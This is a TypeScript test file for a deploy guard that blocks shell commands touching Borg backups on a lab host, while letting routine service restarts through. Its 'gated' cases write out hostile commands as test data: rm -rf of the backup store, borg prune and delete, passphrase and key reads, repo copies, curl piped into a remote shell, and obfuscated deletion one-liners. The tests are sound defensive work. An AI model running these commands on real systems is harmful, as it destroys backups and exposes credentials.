import { describe, expect, it } from "vitest";

import { backupGuardFocus, backupGuardHits } from "../../../deploy/helpers/cockpit-backup-guard.mjs";

// Jochen, 13.10.2026: „Diesen Backup-Ring müssen wir rausmachen.“ Gemeint: ein
// umkehrbarer Routineschritt auf Lab0 (Dienst neu starten, Status lesen) braucht
// kein Ja. Scharf bleibt (30.09.2026): alles, was Sicherungen löscht, ihre
// Aufbewahrung ändert, ihren Inhalt oder ihre Zugangsdaten liest — auch über
// Umwege. Eigene Sonden gegen den Riegel, nicht die Fälle des Autors.

const hits = (run: string, check?: string) => backupGuardHits({ steps: [{ run }], checks: check ? [{ run: check }] : [] });

// Der Lauf 097ec09a (Lab0-Cockpit, 13.10.2026 01:16 UTC) im Wortlaut: 8 Riegel-Treffer
// mit dem alten Stand, nur weil ssh nach Lab0 ging.
const job097ec09a = {
  steps: [
    { run: "ssh -o BatchMode=yes -o ConnectTimeout=15 root@10.0.0.5 'systemctl restart android-adb.service || systemctl start android-adb.service'" },
    { run: "ssh -o BatchMode=yes -o ConnectTimeout=15 root@10.0.0.5 'systemctl restart android-emulator.service || systemctl start android-emulator.service'" },
  ],
  checks: [
    { run: "ssh -o BatchMode=yes -o ConnectTimeout=15 root@10.0.0.5 'systemctl is-active --quiet android-adb.service && systemctl is-active --quiet android-emulator.service'" },
    { run: "ssh -o BatchMode=yes -o ConnectTimeout=15 root@10.0.0.5 'ss -ltn | grep -q \"127.0.0.1:5037\"'" },
  ],
};

// 1 und 2b: Routine und Lesen auf Lab0 — kein Riegel.
const free: Array<[string, string]> = [
  ["restart android-adb on Lab0", "ssh root@10.0.0.5 systemctl restart android-adb.service"],
  ["restart android-emulator on Lab0 by alias", "ssh lab0 'systemctl restart android-emulator.service'"],
  ["start/stop/restart in one go", "ssh -o BatchMode=yes root@10.0.0.5 'systemctl stop android-emulator.service; systemctl start android-adb.service android-emulator.service'"],
  ["cockpit units on Lab0", "ssh root@10.0.0.5 'systemctl restart wireguard-ops-cockpit-api wireguard-ops-cockpit-agent'"],
  ["sudo and bash -c around a restart", "ssh lab0 sudo bash -c 'systemctl restart android-adb.service'"],
  ["status on Lab0", "ssh root@10.0.0.5 'systemctl status android-adb.service --no-pager'"],
  ["journal on Lab0", "ssh root@10.0.0.5 'journalctl -u android-emulator.service -n 100 --no-pager'"],
  ["timer status on Lab0", "ssh root@10.0.0.5 'systemctl list-timers cockpit-borg-retention.timer'"],
  ["metadata of the repo", "ssh root@10.0.0.5 'df -h /media/RAID; du -sh /media/RAID/backup_VServer; ls -l /media/RAID/backup_VServer'"],
  ["existence of the config", "test -f /etc/borgmatic/config.yaml && stat -c %a /etc/borgmatic/config.yaml"],
  ["heredoc script on Lab0 that restarts", "ssh lab0 bash -s <<'EOF'\nsystemctl restart android-adb.service\nsystemctl is-active android-adb.service\nEOF"],
  ["borg reads stay free (10.10.2026)", "borg list ::\nborgmatic check --force\nborg info ::"],
  ["apt on Lab0", "ssh root@10.0.0.5 'apt-get update && apt-get -y upgrade'"],
  ["ssh with input from /dev/null", "ssh root@10.0.0.5 systemctl restart android-adb.service < /dev/null"],
  ["multi-line restart on Lab0", "ssh lab0 'systemctl restart android-adb.service\nsystemctl is-active android-adb.service'"],
  ["multi-line routine on Lab0", "ssh root@10.0.0.5 '\nsystemctl restart android-emulator.service\njournalctl -u android-emulator.service -n 50 --no-pager\nss -ltn | grep -q 5037\n'"],
  ["local inline code after a closed ssh argument", "ssh lab0 'systemctl status android-adb.service'\npython3 -c \"import os; print(os.listdir('.'))\""],
];

// 2: Borg-Aktionen, Repo, Zugangsdaten — auch über Umwege.
const gated: Array<[string, string]> = [
  ["borg prune on Lab0", "ssh root@10.0.0.5 borg prune --keep-daily 1 /media/RAID/backup_VServer/borg"],
  ["borg compact via sudo bash -c", "ssh lab0 sudo bash -c 'borg compact /media/RAID/backup_VServer/borg'"],
  ["borg delete via variable", "R=/media/RAID/backup_VServer/borg\nssh lab0 \"borg delete $R::x\""],
  ["borg mount", "borg mount ssh://borg@10.0.0.5/media/RAID/backup_VServer/borg /mnt/b"],
  ["borg extract", "borg extract ::vmd61162-2026-10-10 etc/shadow"],
  ["borg export-tar on Lab0", "ssh lab0 'borg export-tar /media/RAID/backup_VServer/borg::a - > /tmp/a.tar'"],
  ["borgmatic extract", "borgmatic extract --archive latest"],
  ["borgmatic mount", "borgmatic mount --archive latest --mount-point /mnt/b"],
  ["borgmatic restore", "borgmatic restore --archive latest"],
  ["check --repair", "ssh lab0 borg check --repair /media/RAID/backup_VServer/borg"],
  ["retention service unit stopped on Lab0", "ssh root@10.0.0.5 systemctl stop cockpit-borg-retention.timer"],
  ["retention glob stopped on Lab0", "ssh root@10.0.0.5 'systemctl disable --now cockpit-borg-*'"],
  ["repo removed by glob on Lab0", "ssh lab0 'rm -rf /media/RAI*/backup_*'"],
  ["repo read on Lab0", "ssh lab0 cat /media/RAID/backup_VServer/borg/config"],
  ["repo copied away", "rsync -a root@10.0.0.5:/media/RAID/backup_VServer/ /srv/copy/"],
  ["repo copied by scp", "scp -r lab0:/media/RAID/backup_VServer /tmp/x"],
  ["repo copied by an ancestor", "ssh lab0 'cp -a /media/RAID /mnt/usb/'"],
  ["repo mounted over sshfs", "sshfs lab0:/media /mnt/l0"],
  ["borgmatic config read", "cat /etc/borgmatic/config.yaml"],
  ["borgmatic config read with sudo and glob", "sudo head -n 50 /etc/borg*/config.yaml"],
  ["borgmatic config read inside bash -c", "bash -c 'grep -i passphrase /etc/borgmatic/config.yaml'"],
  ["borgmatic config read through a variable", "C=/etc/borgmatic\ncat $C/config.yaml"],
  ["borgmatic config read by input redirect", "while read l; do echo \"$l\"; done < /etc/borgmatic/config.yaml"],
  ["borgmatic config read by $(<)", "x=$(< /etc/borgmatic/config.yaml)\necho \"$x\""],
  ["borgmatic config copied", "cp /etc/borgmatic/config.yaml /tmp/c.yaml"],
  ["borgmatic config symlinked", "ln -s /etc/borgmatic/config.yaml /tmp/c.yaml"],
  ["borgmatic config dir copied by an ancestor", "cp -a /etc /tmp/etc-copy"],
  ["tar of /root", "tar czf /tmp/r.tgz /root"],
  ["recursive grep over /etc", "grep -r encryption_passphrase /etc"],
  ["borg keys read", "cat /root/.config/borg/keys/*"],
  ["retention passphrase read on Lab0", "ssh root@10.0.0.5 'cat /etc/cockpit-borg-retention/*'"],
  ["config through find -exec cat", "find /etc/borgmatic -type f -exec cat {} \\;"],
  ["config through docker bind", "docker run --rm -v /etc/borgmatic:/c alpine cat /c/config.yaml"],
  ["base64 of the config", "base64 /etc/borgmatic/config.yaml"],
  // Was auf Lab0 läuft, ohne dass der Plan es zeigt.
  ["wrapper script on Lab0", "ssh root@10.0.0.5 /root/aufraeumen.sh"],
  ["bash script on Lab0", "ssh lab0 bash /usr/local/share/x/clean"],
  ["command from a variable on Lab0", "ssh lab0 \"$CMD\""],
  ["eval on Lab0", "ssh lab0 'eval \"$(cat /tmp/x)\"'"],
  ["decoded on Lab0", "ssh lab0 'echo Ym9yZyBwcnVuZQ== | base64 -d | sh'"],
  ["pipe into ssh to Lab0", "echo 'borg prune --keep-daily 1 ::' | ssh lab0 bash"],
  ["opaque pipe into ssh to Lab0", "curl -s https://example.invalid/x | ssh root@10.0.0.5 sh"],
  ["file into ssh to Lab0", "ssh root@10.0.0.5 sh < /tmp/plan.sh"],
  ["Lab0 through -o HostName", "ssh -o HostName=10.0.0.5 kiste /root/x.sh"],
  ["Lab0 heredoc running a foreign script", "ssh lab0 bash -s <<'EOF'\n/root/aufraeumen.sh\nEOF"],
  ["Lab0 heredoc piped", "cat <<'EOF' | ssh lab0 bash\nsystemctl restart android-adb.service\nEOF"],
  ["nested ssh from Lab0", "ssh lab0 ssh borg@localhost"],
  ["deletion after a quoted separator on Lab0", "ssh lab0 'true; rm -rf /srv/x'"],
  ["foreign script after a quoted separator on Lab0", "ssh lab0 'systemctl restart android-adb.service && /root/x.sh'"],
  // Zweitprüfung PR #45: Inline-Code auf Lab0, der den Pfad erst zur Laufzeit baut,
  // und ein Löschwort direkt hinter einem Quote.
  ["python -c on Lab0 with a path built at run time", String.raw`ssh root@10.0.0.5 'python3 -c "import shutil; shutil.rmtree(\"/media/R\"+\"AID\")"'`],
  ["python -c on Lab0 with chr and glob", String.raw`ssh root@10.0.0.5 'python3 -c "import shutil,glob; [shutil.rmtree(p) for p in glob.glob(chr(47)+\"media/R*/b*\")]"'`],
  ["perl -e on Lab0 with a joined path", "ssh root@10.0.0.5 'perl -e \"system(qq{rm -rf /media/R}.qq{AID})\"'"],
  ["node -e on Lab0", String.raw`ssh root@10.0.0.5 'node -e "require(\"fs\").rmSync(\"/media/RAID\",{recursive:true})"'`],
  ["python -c on Lab0 after a quoted separator", "ssh lab0 'systemctl status android-adb.service; python3 -c \"import os; os.system(chr(114)+chr(109))\"'"],
  ["awk system() on Lab0", "ssh lab0 'awk \"BEGIN{system(\\\"true\\\")}\"'"],
  ["rm right after a quote on Lab0", "ssh root@10.0.0.5 'bash -c \"rm -rf /x\"'"],
  ["shred right after a quote on Lab0", "ssh root@10.0.0.5 'bash -c \"shred -u /media/RAID/x\"'"],
  // Zweitprüfung PR #45 (8d4e33e): derselbe Code in einer Folgezeile eines
  // mehrzeiligen ssh-Arguments.
  ["perl -e on the next line of a multi-line ssh argument", "ssh root@10.0.0.5 'systemctl status android-adb.service\nperl -e \"system(qq{rm -rf /media/R}.qq{AID})\"'"],
  ["python -c alone inside a multi-line ssh argument", String.raw`ssh root@10.0.0.5 '
python3 -c "import shutil; shutil.rmtree(\"/media/R\"+\"AID\")"
'`],
  ["python -c on the third line of a multi-line ssh argument", "ssh root@10.0.0.5 'systemctl status x\nsystemctl is-active x\npython3 -c \"import os; os.system(chr(114))\"'"],
  ["awk system() inside a multi-line ssh argument", "ssh root@10.0.0.5 'systemctl status x\nawk \"BEGIN{system(\\\"true\\\")}\"'"],
  ["node -e inside a multi-line ssh argument", String.raw`ssh root@10.0.0.5 '
node -e "require(\"fs\").rmSync(\"/media/RAID\",{recursive:true})"
'`],
  ["ruby -e inside a multi-line ssh argument", "ssh root@10.0.0.5 '\nruby -e \"system(%q{true})\"\n'"],
  ["sed e inside a multi-line ssh argument", "ssh root@10.0.0.5 '\nsed -n \"s/x/y/e\" /tmp/a\n'"],
  ["python -c inside a multi-line double-quoted ssh argument", "ssh lab0 \"\npython3 -c 'import os; os.system(chr(114))'\n\""],
  ["deletion inside a multi-line ssh argument", "ssh root@10.0.0.5 '\nrm -rf /srv/x\n'"],
  ["decoded text inside a multi-line ssh argument", "ssh root@10.0.0.5 '\necho Ym9yZw== | base64 -d | sh\n'"],
];

describe("backup bolt, Lab0 (13.10.2026): routine without the operator", () => {
  it("the recorded run 097ec09a has no bolt hit", () => {
    expect(backupGuardHits(job097ec09a)).toEqual([]);
    // Der Türsteher sieht weiter, dass ssh nach Lab0 geht.
    expect(backupGuardFocus(job097ec09a).length).toBeGreaterThan(0);
  });

  it.each(free)("%s", (_label, run) => {
    expect(hits(run)).toEqual([]);
  });
});

describe("backup bolt, Lab0 (13.10.2026): the backups stay behind the bolt", () => {
  it.each(gated)("%s", (_label, run) => {
    expect(hits(run).length).toBeGreaterThan(0);
  });

  it("a gated line in a check counts as well", () => {
    expect(hits("true", "ssh lab0 cat /etc/cockpit-borg-retention/passphrase")).toEqual([expect.objectContaining({ where: "C1:L1", kind: "backup" })]);
  });

  it("a harmless restart does not launder a deletion in the same plan", () => {
    expect(hits("ssh lab0 'systemctl restart android-adb.service && rm -rf /media/RAID/backup_VServer/borg'").length).toBeGreaterThan(0);
  });
});
